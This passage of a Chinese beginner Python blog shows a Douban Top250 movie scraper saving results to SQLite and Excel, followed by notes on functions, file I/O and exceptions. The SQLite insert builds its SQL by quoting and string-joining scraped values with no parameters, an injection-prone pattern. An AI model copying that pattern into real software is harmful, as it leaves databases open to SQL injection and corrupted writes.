#去掉句号</span><br><span class="line">                data.append(inq)                #添加概述</span><br><span class="line">            else:</span><br><span class="line">                data.append(&quot; &quot;)                #留空</span><br><span class="line"></span><br><span class="line">            bd &#x3D; re.findall(findBd,item)[0]</span><br><span class="line">            bd &#x3D; re.sub(&#39;&lt;br(\s+)?&#x2F;&gt;(\s+)?&#39;,&quot; &quot;,bd)     #去掉&lt;br&#x2F;&gt;等无用字符</span><br><span class="line">            bd &#x3D; re.sub(&#39;&#x2F;&#39;,&quot; &quot;,bd)</span><br><span class="line">            data.append(bd.strip())                     #去掉前后空格并添加</span><br><span class="line"></span><br><span class="line">            datalist.append(data)           #把一部处理好的电影信息存入datalist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return datalist</span><br><span class="line"></span><br><span class="line">#得到一个指定的URL的网页内容</span><br><span class="line">def askURL(url):</span><br><span class="line">    #如果变量多则用键值对，这里只用到了head</span><br><span class="line">    head &#x3D; &#123;    #模拟浏览器的信息，向目标（豆瓣）服务器发送信息</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla &#x2F; 5.0(Windows NT 10.0; Win64;x64) AppleWebKit &#x2F; 537.36(KHTML, like Gecko) Chrome &#x2F; 90.0.4430.85 Safari &#x2F; 537.36&quot;</span><br><span class="line">    &#125;   #用户代理，表示告诉目标（豆瓣）服务器我们是什么类型的机器（浏览器）：本质上是告诉服务器我们可以接受什么水平的文件</span><br><span class="line"></span><br><span class="line">    #发送请求并接收返回应答</span><br><span class="line">    request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">    html &#x3D; &quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">        html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">        #print(html)</span><br><span class="line">    except urllib.error.URLError as e:</span><br><span class="line">        if hasattr(e,&quot;code&quot;):</span><br><span class="line">            pass</span><br><span class="line">         #   print(e,code)</span><br><span class="line">        if hasattr(e,&quot;reason&quot;):</span><br><span class="line">            pass</span><br><span class="line">        #    print(e,r)</span><br><span class="line"></span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">#保存到SQlite数据库</span><br><span class="line">def saveData2DB(datalist,dbpath):</span><br><span class="line">    init_db(dbpath)</span><br><span class="line">    conn &#x3D; sqlite3.connect(dbpath)</span><br><span class="line">    cur &#x3D; conn.cursor()</span><br><span class="line"></span><br><span class="line">    for data in datalist:</span><br><span class="line">        for index in range(len(data)):</span><br><span class="line">            if index &#x3D;&#x3D; 4 or index &#x3D;&#x3D; 5:</span><br><span class="line">                continue</span><br><span class="line">            data[index] &#x3D; &#39;&quot;&#39;+data[index]+&#39;&quot;&#39;</span><br><span class="line">        sql &#x3D; &#39;&#39;&#39;</span><br><span class="line">            insert into movie250(</span><br><span class="line">                info_link, pic_link, cname, ename,score,rating, instroduction, info</span><br><span class="line">            ) VALUES (%s)&#39;&#39;&#39;%&quot;,&quot;.join(data)     #%&quot;,&quot;.join(data),加入data到%S，并且每个字符串用“，”隔开</span><br><span class="line">        cur.execute(sql)</span><br><span class="line">        conn.commit()</span><br><span class="line">    cur.close()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line">#初始化Sqlite数据库</span><br><span class="line">def init_db(dbpath):</span><br><span class="line">    sql &#x3D; &#39;&#39;&#39;</span><br><span class="line">        create table movie250(</span><br><span class="line">            id integer primary key autoincrement,</span><br><span class="line">            info_link text,</span><br><span class="line">            pic_link text,</span><br><span class="line">            cname varchar,</span><br><span class="line">            ename varchar,</span><br><span class="line">            score numeric,</span><br><span class="line">            rating numeric ,</span><br><span class="line">            instroduction text,</span><br><span class="line">            info text</span><br><span class="line">            )&#39;&#39;&#39;</span><br><span class="line">    #创建数据表</span><br><span class="line">    conn &#x3D;sqlite3.connect(dbpath)   #创建数据库连接并返回操作对象</span><br><span class="line">    cursor &#x3D; conn.cursor()          #游标</span><br><span class="line">    cursor.execute(sql)             #执行sql操作语句</span><br><span class="line">    conn.commit()                   #提交到数据库</span><br><span class="line">    conn.close()                    #关闭数据库</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:  #当程序执行时</span><br><span class="line">    #调用函数</span><br><span class="line">    main()</span><br><span class="line">    print(&quot;爬取完毕，写入SQLite数据库完毕！&quot;)</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/07/15/python%E7%88%AC%E5%8F%96%E6%95%B0%E6%8D%AE%E5%B9%B6%E5%AD%98%E5%88%B0Excel%E8%A1%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/15/python%E7%88%AC%E5%8F%96%E6%95%B0%E6%8D%AE%E5%B9%B6%E5%AD%98%E5%88%B0Excel%E8%A1%A8/" class="post-title-link" itemprop="url">python爬取数据并存到Excel表</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-07-15 17:05:35" itemprop="dateCreated datePublished" datetime="2021-07-15T17:05:35+08:00">2021-07-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-29 09:22:28" itemprop="dateModified" datetime="2021-07-29T09:22:28+08:00">2021-07-29</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">python入门</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="python项目1"><a href="#python项目1" class="headerlink" title="python项目1"></a>python项目1</h2><p>项目说明：爬取豆瓣电影网站的Top250部电影的详情信息并存在Excell表里</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"># -*- codeing &#x3D; utf-8 -*-</span><br><span class="line"># @Time : 2021&#x2F;7&#x2F;10 18:10</span><br><span class="line"># @Software: PyCharm</span><br><span class="line"></span><br><span class="line">from bs4 import BeautifulSoup        #网页解析，获取数据</span><br><span class="line">import re           #正则表达式，进行文字匹配</span><br><span class="line">import urllib.request,urllib.error       #制定URL，获取网页数据</span><br><span class="line">import xlwt         #进行excel操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D; r&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    #步骤1：爬取网页 #步骤2：解析数据</span><br><span class="line">    datalist &#x3D; getData(baseurl)     #放回爬取的数据给datalist</span><br><span class="line">    #保存路径</span><br><span class="line">    savepath &#x3D; &quot;.\\豆瓣电影Top250.xls&quot;  #excel保存路径；双斜杠是转译字符，也可以用单斜杠，再像baseurl那样前面加个r</span><br><span class="line">    #步骤3：保存数据</span><br><span class="line">    saveData(datalist, savepath)      #保存到excel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#正则表达式对象</span><br><span class="line">#影片详情链接规则</span><br><span class="line"># .* 与（.*）的区别，（.*）是匹配成功作为返回值，.*是纯匹配</span><br><span class="line">findLink &#x3D; re.compile(r&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&gt;&#39;)      #&quot;?&quot;代表0个或多个，在可能没有的时候要加“?”</span><br><span class="line">#影片图片</span><br><span class="line">findImgSrc &#x3D; re.compile(r&#39;&lt;img.*src&#x3D;&quot;(.*?)&quot;&#39;,re.S)  #re.S:解析匹配包括换行符，在有可能有多行的字符串时用</span><br><span class="line">#影片的片面</span><br><span class="line">findTitle &#x3D; re.compile(r&#39;&lt;span class&#x3D;&quot;title&quot;&gt;(.*)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#影片评分</span><br><span class="line">findRating &#x3D; re.compile(r&#39;&lt;span class&#x3D;&quot;rating_num&quot; property&#x3D;&quot;v:average&quot;&gt;(.*)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#评价人数</span><br><span class="line">findJudge &#x3D; re.compile(r&#39;&lt;span&gt;(\d*)人评价&lt;&#x2F;span&gt;&#39;)    #因为有结构相同的，所以正则表达式要变通，\d是指数字</span><br><span class="line">#概况</span><br><span class="line">findInq &#x3D; re.compile(r&#39;&lt;span class&#x3D;&quot;inq&quot;&gt;(.*)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#影片简介</span><br><span class="line">findBd &#x3D; re.compile(r&#39;&lt;p class&#x3D;&quot;&quot;&gt;(.*?)&lt;&#x2F;p&gt;&#39;,re.S)</span><br><span class="line"></span><br><span class="line">#爬取网页</span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist &#x3D; []</span><br><span class="line">    for i in range(0,10):           #调用获取页面信息的函数，10次</span><br><span class="line">        url &#x3D; baseurl + str(i*25)   #每页有25个，所以这样写</span><br><span class="line">        html &#x3D; askURL(url)          #保存获取到的网页源码</span><br><span class="line">        #步骤2：逐一解析数据</span><br><span class="line">        soup &#x3D;BeautifulSoup(html,&quot;html.parser&quot;)     #参数1：类型，参数2：解析器</span><br><span class="line">        for item in soup.find_all(&#39;div&#39;,class_&#x3D;&quot;item&quot;):     #查找符合要求的字符串并形成列表（在div标签中寻找class&#x3D;item的字符串）</span><br><span class="line">            #print(item)    测试：打印电影item的全部信息</span><br><span class="line">            data &#x3D; []       #保存一部电影的全部信息</span><br><span class="line">            item &#x3D; str(item)    #转为字符串，用于查找</span><br><span class="line"></span><br><span class="line">            #影片详情的链接</span><br><span class="line">            link &#x3D; re.findall(findLink,item)[0]     #re库通过正则表达式解析出符合规定的字符串（链接）</span><br><span class="line">            data.append(link)                       #添加到列表里</span><br><span class="line"></span><br><span class="line">            imgSrc &#x3D; re.findall(findImgSrc,item)[0] #只取第一个（下标0）是因为网页有重复使用</span><br><span class="line">            data.append(imgSrc)</span><br><span class="line"></span><br><span class="line">            titles &#x3D; re.findall(findTitle,item)</span><br><span class="line">            if(len(titles)&#x3D;&#x3D;2):     #由网站可知，一部电影有很多名字</span><br><span class="line">                ctitle &#x3D; titles[0]  #添加中文名</span><br><span class="line">                otitle &#x3D; titles[1].replace(&quot;&#x2F;&quot;,&quot;&quot;)  #添加外文名并去掉无关符号</span><br><span class="line">                data.append(ctitle)</span><br><span class="line">                data.append(otitle)</span><br><span class="line">            else:</span><br><span class="line">                data.append(titles[0])</span><br><span class="line">                data.append(&#39; &#39;)       #若没有2个名字就留空</span><br><span class="line"></span><br><span class="line">            rating &#x3D; re.findall(findRating,item)[0]</span><br><span class="line">            data.append(rating)             #添加评分</span><br><span class="line"></span><br><span class="line">            judgeNum &#x3D; re.findall(findJudge,item)[0]</span><br><span class="line">            data.append(judgeNum)           #添加评价人数</span><br><span class="line"></span><br><span class="line">            inq &#x3D; re.findall(findInq,item)</span><br><span class="line">            if len(inq) !&#x3D; 0:</span><br><span class="line">                inq &#x3D; inq[0].replace(&quot;。&quot;,&quot;&quot;)    #去掉句号</span><br><span class="line">                data.append(inq)                #添加概述</span><br><span class="line">            else:</span><br><span class="line">                data.append(&quot; &quot;)                #留空</span><br><span class="line"></span><br><span class="line">            bd &#x3D; re.findall(findBd,item)[0]</span><br><span class="line">            bd &#x3D; re.sub(&#39;&lt;br(\s+)?&#x2F;&gt;(\s+)?&#39;,&quot; &quot;,bd)     #去掉&lt;br&#x2F;&gt;等无用字符</span><br><span class="line">            bd &#x3D; re.sub(&#39;&#x2F;&#39;,&quot; &quot;,bd)</span><br><span class="line">            data.append(bd.strip())                     #去掉前后空格并添加</span><br><span class="line"></span><br><span class="line">            datalist.append(data)           #把一部处理好的电影信息存入datalist</span><br><span class="line"></span><br><span class="line">    return datalist</span><br><span class="line"></span><br><span class="line">#得到一个指定的URL的网页内容</span><br><span class="line">def askURL(url):</span><br><span class="line">    #如果变量多则用键值对，这里只用到了head</span><br><span class="line">    head &#x3D; &#123;    #模拟浏览器的信息，向目标（豆瓣）服务器发送信息</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla &#x2F; 5.0(Windows NT 10.0; Win64;x64) AppleWebKit &#x2F; 537.36(KHTML, like Gecko) Chrome &#x2F; 90.0.4430.85 Safari &#x2F; 537.36&quot;</span><br><span class="line">    &#125;   #用户代理，表示告诉目标（豆瓣）服务器我们是什么类型的机器（浏览器）：本质上是告诉服务器我们可以接受什么水平的文件</span><br><span class="line"></span><br><span class="line">    #发送请求并接收返回应答</span><br><span class="line">    request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">    html &#x3D; &quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">        html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">        #print(html)</span><br><span class="line">    except urllib.error.URLError as e:</span><br><span class="line">        if hasattr(e,&quot;code&quot;):</span><br><span class="line">            pass</span><br><span class="line">         #   print(e,code)</span><br><span class="line">        if hasattr(e,&quot;reason&quot;):</span><br><span class="line">            pass</span><br><span class="line">        #    print(e,r)</span><br><span class="line"></span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">#保存到Excel表</span><br><span class="line">def saveData(datalist,savepath):</span><br><span class="line">    print(&quot;保存中......&quot;)</span><br><span class="line">    book &#x3D; xlwt.Workbook(encoding&#x3D;&quot;utf-8&quot;,style_compression&#x3D;0)  #创建workbook对象（excell操作文件）</span><br><span class="line">    sheet &#x3D; book.add_sheet(&#39;豆瓣电影Top250&#39;,cell_overwrite_ok&#x3D;True) #创建工作表，参数2为运行覆盖写入</span><br><span class="line">    col &#x3D; (&quot;电影详情链接&quot;,&quot;图片链接&quot;,&quot;电影中文名&quot;,&quot;电影外国名&quot;,&quot;评分&quot;,&quot;评价人数&quot;,&quot;概况&quot;,&quot;相关信息&quot;)</span><br><span class="line">    for i in range(0,8):</span><br><span class="line">        sheet.write(0,i,col[i]) #写入列名</span><br><span class="line">    for i in range(0,250):</span><br><span class="line">        print(&quot;第%d条导入成功&quot;%(i+1))</span><br><span class="line">        data &#x3D; datalist[i]</span><br><span class="line">        for j in range(0,8):</span><br><span class="line">            sheet.write(i+1,j,data[j])      #i+1行，j列写入data[j]数据</span><br><span class="line"></span><br><span class="line">    book.save(savepath)     #保存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:  #当程序执行时</span><br><span class="line">    #调用函数</span><br><span class="line">    main()</span><br><span class="line">    print(&quot;爬取完毕，写入excell表完毕！&quot;)</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/" class="post-title-link" itemprop="url">python基础知识2</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-07-10 11:44:32 / 修改时间：11:45:42" itemprop="dateCreated datePublished" datetime="2021-07-10T11:44:32+08:00">2021-07-10</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">python入门</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="python基础知识2"><a href="#python基础知识2" class="headerlink" title="python基础知识2"></a>python基础知识2</h1><h2 id="一、函数"><a href="#一、函数" class="headerlink" title="一、函数"></a>一、函数</h2><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709153030420.png" alt="image-20210709153030420"></p>
-<h4 id="1-1无参、无返回值函数定义"><a href="#1-1无参、无返回值函数定义" class="headerlink" title="1.1无参、无返回值函数定义"></a>1.1无参、无返回值函数定义</h4><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709153154815.png" alt="image-20210709153154815"></p>
-<h4 id="1-2-带参数的函数"><a href="#1-2-带参数的函数" class="headerlink" title="1.2 带参数的函数"></a>1.2 带参数的函数</h4><p>说明：无需标准数据类型，但是调用时需要注意参数的操作（例如这里是作+运算，所以int和string参与+运算就会报错</p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709153223537.png" alt="image-20210709153223537"></p>
-<h4 id="1-3-带返回值（可多个）"><a href="#1-3-带返回值（可多个）" class="headerlink" title="1.3 带返回值（可多个）"></a>1.3 带返回值（可多个）</h4><p>说明：注意接收返回值形式</p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709153852089.png" alt="image-20210709153852089"></p>
-<h4 id="2-1函数的局部变量和全局变量"><a href="#2-1函数的局部变量和全局变量" class="headerlink" title="2.1函数的局部变量和全局变量"></a>2.1函数的局部变量和全局变量</h4><p>说明：函数内部默认局部变量的优先级要比全局变量的优先级高</p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709154129514.png" alt="image-20210709154129514"></p>
-<p>要想操作全局变量，需要用global关键字标注</p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709154313667.png" alt="image-20210709154313667"></p>
-<h2 id="二、文件操作"><a href="#二、文件操作" class="headerlink" title="二、文件操作"></a>二、文件操作</h2><h4 id="2-1打开和关闭文件"><a href="#2-1打开和关闭文件" class="headerlink" title="2.1打开和关闭文件"></a>2.1打开和关闭文件</h4><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709162919335.png"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163003281.png" alt="image-20210709163003281"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163016519.png" alt="image-20210709163016519"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163050685.png" alt="image-20210709163050685"></p>
-<h4 id="2-2-写入文件"><a href="#2-2-写入文件" class="headerlink" title="2.2 写入文件"></a>2.2 写入文件</h4><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163143667.png" alt="image-20210709163143667"></p>
-<h4 id="2-3-读取"><a href="#2-3-读取" class="headerlink" title="2.3 读取"></a>2.3 读取</h4><h5 id="2-3-1-read"><a href="#2-3-1-read" class="headerlink" title="2.3.1 read()"></a>2.3.1 read()</h5><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163303446.png" alt="image-20210709163303446"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163227786.png" alt="image-20210709163227786"></p>
-<h5 id="2-3-2-readlines"><a href="#2-3-2-readlines" class="headerlink" title="2.3.2 readlines()"></a>2.3.2 readlines()</h5><p>说明：读取全部内容，没行占一个列表元素</p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163739732.png" alt="image-20210709163739732"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210710104513238.png" alt="image-20210710104513238"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210710104432132.png" alt="image-20210710104432132"></p>
-<h5 id="2-3-3-readline"><a href="#2-3-3-readline" class="headerlink" title="2.3.3 readline()"></a>2.3.3 readline()</h5><p>说明：每次读取一行</p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163812423.png" alt="image-20210709163812423"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709163648923.png" alt="image-20210709163648923"></p>
-<h4 id="2-4-文件的其他操作"><a href="#2-4-文件的其他操作" class="headerlink" title="2.4 文件的其他操作"></a>2.4 文件的其他操作</h4><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709164001927.png" alt="image-20210709164001927"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709164032286.png" alt="image-20210709164032286"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709164049800.png" alt="image-20210709164049800"></p>
-<h2 id="三、异常处理"><a href="#三、异常处理" class="headerlink" title="三、异常处理"></a>三、异常处理</h2><h3 id="3-1-try-…（执行代码块）…except…（捕获异常后，执行的代码块）…"><a href="#3-1-try-…（执行代码块）…except…（捕获异常后，执行的代码块）…" class="headerlink" title="3.1 try …（执行代码块）…except…（捕获异常后，执行的代码块）…"></a>3.1 try …（执行代码块）…except…（捕获异常后，执行的代码块）…</h3><p>说明：except异常类型想要被捕获，需要一致，如下</p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709173627788.png" alt="image-20210709173627788"></p>
-<h4 id="3-1-2-捕获多种类型错误"><a href="#3-1-2-捕获多种类型错误" class="headerlink" title="3.1.2 捕获多种类型错误"></a>3.1.2 捕获多种类型错误</h4><p>说明：每次次只会捕获第一个错误</p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709173712915.png" alt="image-20210709173712915"></p>
-<h4 id="3-1-3-捕获并抛出错误信息：as-result"><a href="#3-1-3-捕获并抛出错误信息：as-result" class="headerlink" title="3.1.3 捕获并抛出错误信息：as result"></a>3.1.3 捕获并抛出错误信息：as result</h4><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709173944085.png" alt="image-20210709173944085"></p>
-<h4 id="3-1-4-捕获全部异常的异常类型：Exception"><a href="#3-1-4-捕获全部异常的异常类型：Exception" class="headerlink" title="3.1.4 捕获全部异常的异常类型：Exception"></a>3.1.4 捕获全部异常的异常类型：Exception</h4><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709174224284.png" alt="image-20210709174224284"></p>
-<h3 id="3-2-try…-finally…（一定会执行代码块）…"><a href="#3-2-try…-finally…（一定会执行代码块）…" class="headerlink" title="3.2 try….finally…（一定会执行代码块）…"></a>3.2 try….finally…（一定会执行代码块）…</h3><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709174736686.png" alt="image-20210709174736686"></p>
-<p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709174830363.png" alt="image-20210709174830363"></p>
-<h3 id="3-3-练习"><a href="#3-3-练习" class="headerlink" title="3.3 练习"></a>3.3 练习</h3><p><img src="/2021/07/10/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/image-20210709174917975.png" alt="image-20210709174917975"></p>
-<p>参考答案（这里还有一些要改进的地方）</p>
-<p>提升：捕捉错误尽量在可能出错的地方捕捉，范围不要太广</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">def Rfile():</span><br><span class="line">#    name &#x3D; input(&quot;输入要读取的文件名：&quot;)</span><br><span class="line">#    f &#x3D;open(name,&quot;w&quot;)</span><br><span class="line">    try:</span><br><span class="line">        f &#x3D; open(&quot;gushi.txt&quot;, &quot;w&quot;)</span><br><span class="line">    except Exception as 